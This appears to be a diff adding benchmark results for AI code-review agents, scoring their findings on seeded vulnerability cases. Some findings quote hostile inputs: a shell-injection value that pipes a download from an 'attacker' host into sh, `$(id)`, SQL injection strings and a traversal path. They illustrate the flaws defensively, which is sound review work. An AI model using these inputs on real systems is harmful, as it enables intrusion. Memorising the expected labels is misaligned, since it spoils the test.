+              "title": "create_archive returns CompletedProcess while sibling returns bytes",
+              "body": "`list_exports` returns `.stdout` (bytes), whereas `create_archive` returns the whole `CompletedProcess` object, and without `capture_output=True` its `stdout` attribute is `None`. Callers of this module will get two different return shapes from adjacent functions. Either return the archive path (the useful value for an export command) or `None`, and be consistent about it.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:9",
+              "matched_labels": [
+                "export/archive.py:9"
+              ],
+              "cites": [
+                "export/archive.py:10",
+                "export/archive.py:5"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "docs",
+              "category": "documentation",
+              "severity": "info",
+              "confidence": 0.72,
+              "where": "export/archive.py:8-10",
+              "title": "Public function `create_archive` lacks parameter and return documentation",
+              "body": "The new public function `create_archive` has no docstring explaining what its parameters accept, what it returns, or what exceptions it may raise. A caller would need to reverse-engineer the behavior from the code itself. At minimum, document whether `name` should include or exclude file extensions, what format `directory` should be in (absolute path? relative?), and what the return value represents.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "export/archive.py:8"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-hardcoded-credential",
+          "hits": 2,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.768,
+          "cost_usd": 0.1369,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "secrets",
+              "severity": "critical",
+              "confidence": 0.96,
+              "where": "billing/acmepay_client.py:4-8",
+              "title": "Live AcmePay secret key hardcoded in source",
+              "body": "`ACMEPAY_SECRET_KEY = \"acme_live_...\"` is a production payment-processor secret committed to source control, and `client()` now assigns it to `acmepay.api_key` instead of reading `os.environ[\"ACMEPAY_SECRET_KEY\"]`. The `acme_live_` prefix indicates a live-mode key, not a test key.\n\nWho: anyone with read access to the repository or its history \\u2014 all contributors, anyone who forks or clones, CI systems that archive the checkout, and any third party if the repo is or becomes public. What they control: nothing; possession is sufficient. What they get: the ability to authenticate to AcmePay as this merchant \\u2014 create charges, issue refunds, and read stored customer/payment data.\n\nActions: (1) treat this key as compromised and rotate it at AcmePay immediately \\u2014 it is in git history even if the line is deleted in a follow-up commit; (2) restore the `os.environ[\"ACMEPAY_SECRET_KEY\"]` lookup and the `import os` this diff removed; (3) consider purging history or at minimum confirming rotation before the repo is shared further.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "billing/acmepay_client.py:4",
+              "matched_labels": [
+                "billing/acmepay_client.py:4"
+              ],
+              "cites": [
+                "billing/acmepay_client.py:4",
+                "billing/acmepay_client.py:8"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "logic",
+              "severity": "major",
+              "confidence": 0.78,
+              "where": "billing/acmepay_client.py:4-8",
+              "title": "Env-based key config removed: non-prod deploys now use the baked-in key",
+              "body": "`client()` previously read `os.environ[\"ACMEPAY_SECRET_KEY\"]`, which (a) let each environment supply its own key and (b) raised `KeyError` immediately if the key was missing, so a misconfigured deploy failed loudly before any charge went out. After this change the key is a module constant, so any deployment that sets `ACMEPAY_SECRET_KEY` has that value silently ignored \u2014 staging, CI and local runs will now authenticate against whatever account this constant belongs to (the value is prefixed `acme_live_`), and charges from non-production will succeed instead of erroring. Restore the environment lookup (optionally with an explicit, validated fallback) so the key remains per-environment and a missing key still fails fast.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "billing/acmepay_client.py:4",
+              "matched_labels": [
+                "billing/acmepay_client.py:4"
+              ],
+              "cites": [
+                "billing/acmepay_client.py:4",
+                "billing/acmepay_client.py:8"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "billing/acmepay_client.py:4-8",
+              "title": "client() now hardcodes a live secret key with no test catching the change",
+              "body": "The change replaces `acmepay.api_key = os.environ[\"ACMEPAY_SECRET_KEY\"]` with a hardcoded literal `ACMEPAY_SECRET_KEY`. Only a fixture (tests/fixtures/acmepay.py) was added \u2014 there is no actual test that calls `client()` and asserts what `acmepay.api_key` is set to. If this regressed back to reading from env, or if the literal were wrong, nothing in this PR would fail. Add a test that calls `client()` and asserts `acmepay.api_key` equals the expected value (ideally sourced from a non-hardcoded config in real code, but at minimum verified by a test).",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "tests/fixtures/acmepay.py:6",
+              "matched_labels": [
+                "tests/fixtures/acmepay.py:6"
+              ],
+              "cites": [
+                "billing/acmepay_client.py:7",
+                "tests/fixtures/acmepay.py:1"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "test_quality",
+              "severity": "minor",
+              "confidence": 0.56,
+              "where": "tests/fixtures/acmepay.py:6-7",
+              "title": "fake_client() return shape does not match client()",
+              "body": "`client()` returns the `acmepay` module (with `api_key` set as a module attribute), but `fake_client()` returns a plain dict `{\"api_key\": TEST_KEY}`. Any test that substitutes this fixture for the real client will exercise attribute-style access (`c.api_key`, `c.Charge.create(...)`) against a mapping and either fail for the wrong reason or pass while covering nothing of the real interface. Make the fixture return an object exposing the same attributes the production client does (e.g. a small stub class or `SimpleNamespace`).",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "tests/fixtures/acmepay.py:6",
+              "matched_labels": [
+                "tests/fixtures/acmepay.py:6"
+              ],
+              "cites": [
+                "tests/fixtures/acmepay.py:6",
+                "billing/acmepay_client.py:9"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-sql-injection-fstring",
+          "hits": 1,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.897,
+          "cost_usd": 0.0929,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "critical",
+              "confidence": 0.95,
+              "where": "billing/queries.py:8-10",
+              "title": "search_customers interpolates values instead of passing params to execute()",
+              "body": "`execute(sql, params=None)` is documented as \"Run a parameterised query. `params` must carry every caller value.\" This call passes no `params` at all and instead splices `term` and `status` into the SQL text. Two concrete failures follow from that:\n\n1. Correctness: any `term` or `status` containing a single quote (e.g. `O'Brien`, a very ordinary customer name) terminates the string literal and the query fails to parse \u2014 a reachable crash on normal input, not just on hostile input. A `None` argument silently becomes the literal text `None` and matches nothing rather than raising.\n2. The same splice is the injection vector, since caller text lands in the statement body.\n\nFix by keeping the wildcards in the bound value: `execute(\"SELECT * FROM customers WHERE name LIKE %s AND status = %s\", (f\"%{term}%\", status))`, matching the parameterised form already used by `get_customer` on line 5.",
+              "agreeing": [
+                "correctness"
+              ],
+              "categories": [
+                "api_contract",
+                "logic"
+              ],
+              "matched_label": "billing/queries.py:9",
+              "matched_labels": [
+                "billing/queries.py:9"
+              ],
+              "cites": [
+                "billing/queries.py:9",
+                "billing/queries.py:10",
+                "billing/db.py:4",
+                "billing/queries.py:5"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "injection",
+              "severity": "critical",
+              "confidence": 0.93,
+              "where": "billing/queries.py:8-10",
+              "title": "SQL injection: search_customers interpolates term/status into SQL",
+              "body": "`search_customers` composes the query with an f-string, placing `term` and `status` unescaped inside single-quoted SQL literals, then calls `execute(sql)` with no params. Any caller value containing a single quote breaks out of the literal: e.g. `status = \"x' OR '1'='1\"` returns every customer row, and `term = \"%' UNION SELECT ... -- \"` lets the caller choose the projected data (or, on a driver permitting stacked statements, run arbitrary DML).\n\nThe adjacent `get_customer` on line 5 already shows the correct pattern, and `billing/db.py` documents that `params` must carry every caller value. Fix by doing the same:\n\n```python\ndef search_customers(term, status):\n    sql = \"SELECT * FROM customers WHERE name LIKE %s AND status = %s\"\n    return execute(sql, (f\"%{term}%\", status))\n```\n\nNote the wildcards belong in the bound parameter, not in the SQL text. Consider also escaping `%`/`_` in `term` if literal matching is wanted.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "billing/queries.py:9",
+              "matched_labels": [
+                "billing/queries.py:9"
+              ],
+              "cites": [
+                "billing/queries.py:9",
+                "billing/queries.py:10",
+                "billing/db.py:4",
+                "billing/queries.py:5"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "docs",
+              "category": "documentation",
+              "severity": "major",
+              "confidence": 0.92,
+              "where": "billing/queries.py:8-10",
+              "title": "Function violates documented parameterized query requirement",
+              "body": "The `search_customers` function calls `execute()` with an f-string SQL query containing unsanitized user input, directly contradicting the documented contract of `execute()` in db.py which states: \"Run a parameterised query. `params` must carry every caller value.\" The function signature and implementation are now at odds with the established API contract that all callers must follow.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "billing/queries.py:8",
+                "billing/db.py:5",
+                "billing/queries.py:4"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.75,
+              "where": "billing/queries.py:8-10",
+              "title": "No test covers search_customers behavior or query safety",
+              "body": "search_customers is new and has no accompanying test. It interpolates term and status directly into the SQL string instead of using parameterized execute() like get_customer does. A test asserting the actual SQL/params passed to execute() (or an integration test with special characters like quotes) would catch both incorrect query construction and the injection risk. As it stands, nothing in the test suite would fail if this function were broken or exploited.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "billing/queries.py:8"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-timing-unsafe-compare",
+          "hits": 1,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "auto_post",
+          "expected_decision": null,
+          "confidence": 0.794,
+          "cost_usd": 0.0715,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "crypto",
+              "severity": "major",
+              "confidence": 0.988,
+              "where": "webhooks/verify.py:12",
+              "title": "verify_acmepay compares HMACs with == instead of compare_digest",
+              "body": "`verify_acmepay` is a line-for-line copy of `verify_stripe` except that the final comparison uses `expected == header` rather than `hmac.compare_digest(expected, header)`. Python's `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the signature are correct, which allows an attacker who can submit repeated webhook deliveries to recover a valid signature byte by byte. There is also a silent behavioural difference: if `header` arrives as `bytes` rather than `str`, `==` returns `False` (treated as an invalid signature) whereas `compare_digest` raises `TypeError`, so a type regression in the caller would fail closed but silently rather than surfacing. Replace line 12 with `return hmac.compare_digest(expected, header)` to match the Stripe path.\n\n_Also raised by the security agent:_ Webhook HMAC compared with `==` instead of hmac.compare_digest",
+              "agreeing": [
+                "correctness",
+                "security"
+              ],
+              "categories": [
+                "crypto"
+              ],
+              "matched_label": "webhooks/verify.py:12",
+              "matched_labels": [
+                "webhooks/verify.py:12"
+              ],
+              "cites": [
+                "webhooks/verify.py:10",
+                "webhooks/verify.py:7",
+                "webhooks/verify.py:12"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "webhooks/verify.py:10-12",
+              "title": "New verify_acmepay function ships with no test coverage",
+              "body": "verify_acmepay is a new public function with signature-verification logic (including a subtle behavioral difference from verify_stripe: it uses `==` instead of `hmac.compare_digest`). No test file is included in this diff, so there is nothing to catch a regression in either the correctness of the comparison (e.g. valid/invalid signature handling) or timing-safety. Even a straightforward correctness test (valid header passes, invalid header fails) would not surface the `==` vs `compare_digest` difference, but at minimum such a test should exist to lock in expected behavior, mirroring whatever coverage verify_stripe has.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "webhooks/verify.py:10"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-weak-password-hash",
+          "hits": 1,
+          "missed": 1,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": null,
+          "confidence": 0.829,
+          "cost_usd": 0.0882,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "crypto",
+              "severity": "critical",
+              "confidence": 0.99,
+              "where": "auth/passwords.py:10-11",
+              "title": "Reset-path passwords hashed with unsalted MD5 instead of bcrypt",
+              "body": "`hash_reset_password` produces an unsalted MD5 digest of the user's password, while `hash_password` immediately above uses bcrypt with a generated salt. Any password written through the reset path is therefore protected by a fast, unsalted, GPU-friendly hash: an attacker who obtains the credential store (leaked backup, SQLi read, insider, replica snapshot) recovers plaintext for common passwords instantly via rainbow tables, and brute-forces the rest at billions of guesses/second. Unsalted digests also let the holder spot users sharing a password without cracking anything.\n\nThe adversary controls no input here \u2014 that is what makes it worse, not better: the weakness is realised purely by reading the table. Additionally, having two hash formats in one column means verification has to accept MD5, so the weak format stays exploitable for every account that ever used reset.\n\nFix: delete this helper and call `hash_password` (bcrypt) on the reset path as well. If the intent was a short-lived reset *token* rather than a password, it should be `secrets.token_urlsafe()` with an expiry and a timing-safe comparison, not a digest of user-supplied text.\n\n_Also raised by the correctness agent:_ Reset path hashes passwords with unsalted MD5, not bcrypt",
+              "agreeing": [
+                "correctness",
+                "security"
+              ],
+              "categories": [
+                "crypto"
+              ],
+              "matched_label": "auth/passwords.py:11",
+              "matched_labels": [
+                "auth/passwords.py:11"
+              ],
+              "cites": [
+                "auth/passwords.py:10",
+                "auth/passwords.py:6"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "auth/passwords.py:10-11",
+              "title": "New reset-password hashing has no test coverage",
+              "body": "hash_reset_password is a new public function with no accompanying test. There's no existing test file in this diff, so nothing currently exercises it or would fail if its behavior (e.g., using md5, or truncation, or exceptions on bad input) changed or regressed. Given this is on an authentication path, at minimum a test verifying it produces a deterministic hex digest and handles edge cases would prevent silent regressions.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "auth/passwords.py:10"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "trap-md5-for-cache-key",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": null,
+          "confidence": 0.64,
+          "cost_usd": 0.105,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.72,
+              "where": "render/cache.py:9-10",
+              "title": "Key derivation now rejects non-JSON-serialisable context values",
+              "body": "The old key was `(template_source, tuple(sorted(context.items())))`, which accepted any *hashable* value: `datetime`, `Decimal`, `Enum`, frozensets, custom objects with `__hash__`. The new key runs `json.dumps([template_source, context])`, which raises `TypeError: Object of type X is not JSON serializable` for all of those. The exception escapes `cached_render` before `_render` is ever called, so callers that previously rendered fine now fail outright \\u2014 and it fails on the *first* call, not just on a cache miss path.\n\nIf the context is meant to be arbitrary, use `json.dumps(..., default=repr)` (accepting the weaker distinguishing power) or keep a structural key and fall back to the tuple form when serialisation fails. At minimum, the accepted value domain should be documented and asserted in tests.",
+              "agreeing": [
+                "correctness"
+              ],
+              "categories": [
+                "api_contract",
+                "logic"
+              ],
+              "matched_label": "render/cache.py:9",
+              "matched_labels": [
+                "render/cache.py:9"
+              ],
+              "cites": [
+                "render/cache.py:9",
+                "render/cache.py:7",
+                "render/cache.py:9",
+                "tests/test_cache.py:13"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "minor",
+              "confidence": 0.5,
+              "where": "render/cache.py:9-10",
+              "title": "No test for context values that are hashable but not JSON-serializable",
+              "body": "The old key construction only required context values to be hashable and orderable (`tuple(sorted(context.items()))`). The new implementation serializes context via `json.dumps`, which will raise `TypeError` for any value that isn't natively JSON-serializable (e.g. datetimes, custom objects, sets). This is a behaviour change from the previous cache key strategy that none of the added tests exercise \u2014 all three tests use plain int values.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "render/cache.py:9"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "trap-subprocess-list-args",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": null,
+          "confidence": 0.562,
+          "cost_usd": 0.1557,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "export/archive.py:11-15",
+              "title": "No test verifies argv is a properly split list, only that shell=False",
+              "body": "test_runs_without_a_shell only asserts spy.last_call.kwargs[\"shell\"] is False; it never inspects the positional args passed to subprocess.run. The actual security fix here is passing a list of discrete argv elements (name and directory kept separate, with a '--' separator) instead of a shell string. If a future change reintroduced string interpolation into a single list element (e.g. [f\"tar -czf ... {directory}\"]) while keeping shell=False, this test would still pass even though the intended mitigation and correct tar invocation would be broken. Add an assertion on spy.last_call.args (or equivalent) checking the exact list, e.g. that directory appears as its own argv element after '--'.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "tests/test_archive.py:6",
+              "matched_labels": [
+                "tests/test_archive.py:6"
+              ],
+              "cites": [
+                "tests/test_archive.py:6",
+                "export/archive.py:11"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "security",
+              "category": "input_validation",
+              "severity": "major",
+              "confidence": 0.55,
+              "where": "export/archive.py:11-15",
+              "title": "`directory` reaches tar argv unvalidated \u2014 arbitrary path can be archived",
+              "body": "`name` is now tightly constrained by `SAFE_NAME.fullmatch`, but `directory` is passed straight through to the `tar` argv with no validation or containment check. The `--` guard on line 12 correctly prevents it from being parsed as an option, so this is not option injection \u2014 the remaining issue is scope: whatever path the caller supplies gets read and written into `/exports/<name>.tar.gz`.\n\nIf `directory` is reachable from a request parameter (an export/backup endpoint is the usual shape), a caller can pass `/root`, `/etc`, or an app config directory and then retrieve the resulting archive from `/exports`, turning this into arbitrary file disclosure. Consider resolving the path (`os.path.realpath`) and asserting it stays under an allowed export root before invoking tar.\n\nI could not see the caller in this diff or in retrieved context, so I cannot confirm the entry point is attacker-reachable; if `directory` is only ever supplied by internal scheduled jobs, this is informational.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:11",
+              "matched_labels": [
+                "export/archive.py:11"
+              ],
+              "cites": [
+                "export/archive.py:9",
+                "export/archive.py:12",
+                "export/archive.py:7"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.55,
+              "where": "export/archive.py:12",
+              "title": "`directory` is now a single argv token; multi-path callers silently break",
+              "body": "Previously `directory` was interpolated into a shell command line, so a caller could legitimately pass `\"/srv/a /srv/b\"` or `\"--exclude=tmp /srv/data\"` and the shell would split it into separate tar arguments. With the list form plus `--`, the whole string is handed to tar as one literal path, so such a caller now fails with `tar: '/srv/a /srv/b': Cannot stat` and `check=True` turns that into `CalledProcessError`. This is a runtime failure, not a static one, so it will not show up until the job runs. Please check the call sites: if any pass more than one path or any tar option, change the signature to accept a list of directories and splat it into the argv.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:11",
+              "matched_labels": [
+                "export/archive.py:11"
+              ],
+              "cites": [
+                "export/archive.py:11"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "minor",
+              "confidence": 0.6,
+              "where": "export/archive.py:4-10",
+              "title": "Allowlist rejects names that previously worked (dots, >64 chars)",
+              "body": "`SAFE_NAME` permits only `[A-Za-z0-9_-]` and at most 64 characters. Under the old shell-interpolated implementation any name without shell metacharacters worked, including very common ones such as `report.2024`, `tenant.eu-west`, or timestamped names longer than 64 chars. Those callers now get a hard `ValueError` at a call site that previously succeeded, and the failure mode is a raised exception rather than a degraded archive, so it will surface as an outage of whatever job builds the name. Either widen the class to include `.` (and keep traversal safe by rejecting `..` and `/` explicitly), or confirm against the actual call sites that no caller constructs a dotted or long name.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:11",
+              "matched_labels": [
+                "export/archive.py:11"
+              ],
+              "cites": [
+                "export/archive.py:4",
+                "export/archive.py:9"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "test_quality",
+              "severity": "minor",
+              "confidence": 0.5,
+              "where": "tests/test_archive.py:6-8",
+              "title": "`spy` fixture is not defined in this change",
+              "body": "`test_runs_without_a_shell` requests a `spy` fixture and reads `spy.last_call.kwargs[\"shell\"]`, but no `conftest.py` or fixture definition is included in the diff. If the fixture does not already exist in the test tree, this test errors at collection with `fixture 'spy' not found` rather than passing, which means the `shell=False` guarantee is in fact untested. Also note the assertion only inspects the kwargs \u2014 it would still pass if the first positional argument were a shell string, so asserting the argv list is a list with the expected elements would make the test actually pin the behaviour being claimed.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "tests/test_archive.py:6",
+              "matched_labels": [
+                "tests/test_archive.py:6"
+              ],
+              "cites": [
+                "tests/test_archive.py:6"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "provider": "anthropic",
+      "models": {
+        "security": "claude-opus-5",
+        "correctness": "claude-opus-5",
+        "tests": "claude-sonnet-5",
+        "docs": "claude-haiku-4-5"
+      },
+      "cases": 8,
+      "overall": {
+        "hits": 7,
+        "allowed": 11,
+        "labels_found": 7,
+        "concerns": 7,
+        "duplicate_rate": 1.0,
+        "false_positives": 0,
+        "unlabelled": 1,
+        "misses": 1,
+        "precision_strict": 0.875,
+        "precision_lenient": 1.0,
+        "recall": 0.875,
+        "f1": 0.875
+      },
+      "by_agent": {
+        "correctness": {
+          "hits": 3,
+          "allowed": 4,
+          "labels_found": 3,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 1,
+          "misses": 1,
+          "precision_strict": 0.75,
+          "precision_lenient": 1.0,
+          "recall": 0.75,
+          "f1": 0.75
+        },
+        "docs": {
+          "hits": 0,
+          "allowed": 1,
+          "labels_found": 0,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 0.0,
+          "precision_lenient": 0.0,
+          "recall": 0.0,
+          "f1": 0.0
+        },
+        "security": {
+          "hits": 4,
+          "allowed": 1,
+          "labels_found": 4,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 1.0,
+          "precision_lenient": 1.0,
+          "recall": 1.0,
+          "f1": 1.0
+        },
+        "tests": {
+          "hits": 0,
+          "allowed": 5,
+          "labels_found": 0,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 0.0,
+          "precision_lenient": 0.0,
+          "recall": 0.0,
+          "f1": 0.0
+        }
+      },
+      "calibration": {
+        "bins": [
+          {
+            "range": "0.50-0.60",
+            "n": 1,
+            "mean_confidence": 0.55,
+            "observed_hit_rate": 1.0,
+            "gap": 0.45
+          },
+          {
+            "range": "0.60-0.70",
+            "n": 1,
+            "mean_confidence": 0.62,
+            "observed_hit_rate": 1.0,
+            "gap": 0.38
+          },
+          {
+            "range": "0.90-1.01",
+            "n": 5,
+            "mean_confidence": 0.96,
+            "observed_hit_rate": 1.0,
+            "gap": 0.04
+          }
+        ],
+        "expected_calibration_error": 0.147
+      },
+      "category_agreement": 0.857,
+      "agent_attribution": 1.0,
+      "decision_accuracy": 1.0,
+      "cost": {
+        "total_usd": 0.7255,
+        "per_case_usd": 0.0907
+      },
+      "per_case": [
+        {
+          "id": "neg-allowlisted-dynamic-sql",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "suppress",
+          "expected_decision": "suppress",
+          "confidence": 1.0,
+          "cost_usd": 0.041,
+          "failed_agents": [],
+          "error": null,
+          "findings": []
+        },
+        {
+          "id": "sec-command-injection",
+          "hits": 2,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.771,
+          "cost_usd": 0.0845,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "injection",
+              "severity": "critical",
+              "confidence": 0.978,
+              "where": "export/archive.py:8-10",
+              "title": "Command injection: shell=True with interpolated name/directory",
+              "body": "`cmd = f\"tar -czf /exports/{name}.tar.gz {directory}\"` is executed via `subprocess.run(cmd, shell=True)`. Neither parameter is quoted, escaped or validated, so any shell metacharacter in `name` or `directory` is interpreted by `/bin/sh`. A value such as `directory = \"x; curl attacker/s | sh\"` or `name = \"a$(id)\"` runs arbitrary commands as the service user; `name = \"../../etc/cron.d/x\"` additionally writes the tarball outside `/exports`.\n\nFix by dropping the shell and passing an argument vector, mirroring `list_exports` on line 5:\n\n```python\nsubprocess.run([\"tar\", \"-czf\", f\"/exports/{name}.tar.gz\", directory], check=True)\n```\n\nAnd separately constrain `name` to a safe charset (e.g. `[A-Za-z0-9_-]+`) and resolve `directory` against an allowed root so the output path cannot escape `/exports` even without a shell.\n\n_Also raised by the correctness agent:_ Unquoted f-string interpolation into shell=True breaks on spaces/metacharacters",
+              "agreeing": [
+                "correctness",
+                "security"
+              ],
+              "categories": [
+                "injection",
+                "input_validation"
+              ],
+              "matched_label": "export/archive.py:9",
+              "matched_labels": [
+                "export/archive.py:9"
+              ],
+              "cites": [
+                "export/archive.py:9",
+                "export/archive.py:10",
+                "export/archive.py:5"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "export/archive.py:8-10",
+              "title": "No test coverage for create_archive shell-injection-prone path",
+              "body": "create_archive builds a shell command via string interpolation of `name` and `directory` and runs it with shell=True. No test exercises this function at all, so a change to the command construction (or a regression reintroducing/worsening injection behavior) would not be caught. Add a test that invokes create_archive with a benign and a malicious-looking name/directory and asserts on the resulting subprocess arguments or on the file actually produced.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "export/archive.py:8"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "minor",
+              "confidence": 0.55,
+              "where": "export/archive.py:10",
+              "title": "Return shape differs from sibling function in the same module",
+              "body": "`list_exports` returns `.stdout` (bytes), while `create_archive` returns the whole `CompletedProcess`. Callers reading this module will reasonably expect a consistent convention. Either return `.stdout` (it will be empty for tar without `-v`) or return nothing and let `check=True` signal failure; returning a half-used `CompletedProcess` invites callers to inspect `returncode`, which can only ever be 0 here because `check=True` raises otherwise.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:9",
+              "matched_labels": [
+                "export/archive.py:9"
+              ],
+              "cites": [
+                "export/archive.py:5",
+                "export/archive.py:10"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-hardcoded-credential",
+          "hits": 1,
+          "missed": 1,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.879,
+          "cost_usd": 0.0924,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "secrets",
+              "severity": "critical",
+              "confidence": 0.99,
+              "where": "billing/acmepay_client.py:4-8",
+              "title": "Live AcmePay secret key hardcoded, replacing env var lookup",
+              "body": "`ACMEPAY_SECRET_KEY` is committed as a literal with an `acme_live_` prefix, and `client()` now assigns it to `acmepay.api_key` instead of reading `os.environ[\"ACMEPAY_SECRET_KEY\"]` (the `import os` and env lookup were both deleted in this hunk). The adversary is anyone with read access to the repository or to anything derived from it \u2014 contractors, CI build artifacts, a forked or later-public clone, a leaked backup. They control nothing and still obtain a production payments credential, which typically permits creating charges, issuing refunds to attacker-controlled destinations, and reading customer/payment records.\n\nActions: (1) treat the key as compromised and rotate it at AcmePay now \u2014 removing the line does not un-leak it, since it is in git history; (2) restore the `os.environ[\"ACMEPAY_SECRET_KEY\"]` lookup (or a secrets-manager fetch) and re-add `import os`; (3) purge the value from history or confirm with AcmePay that the old key is revoked.\n\n_Also raised by the correctness agent:_ Live API key hardcoded, removing per-environment configuration",
+              "agreeing": [
+                "correctness",
+                "security"
+              ],
+              "categories": [
+                "secrets"
+              ],
+              "matched_label": "billing/acmepay_client.py:4",
+              "matched_labels": [
+                "billing/acmepay_client.py:4"
+              ],
+              "cites": [
+                "billing/acmepay_client.py:4",
+                "billing/acmepay_client.py:8"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "test_quality",
+              "severity": "minor",
+              "confidence": 0.6,
+              "where": "tests/fixtures/acmepay.py:6-7",
+              "title": "fake_client() return shape does not match client()",
+              "body": "`client()` returns the `acmepay` module itself and configures the key via the module-level attribute `acmepay.api_key`. `fake_client()` instead returns a plain dict `{\"api_key\": TEST_KEY}`, which exposes none of the module's call surface (e.g. charge/customer functions). Any test that substitutes `fake_client()` for `client()` will either fail with `KeyError`/`TypeError` on the first real call, or will only pass because it never exercises the module API \u2014 in which case it is not testing the production path. Make the fake a stub object that mirrors the attributes callers actually use.",
+              "agreeing": [],
+              "categories": [],
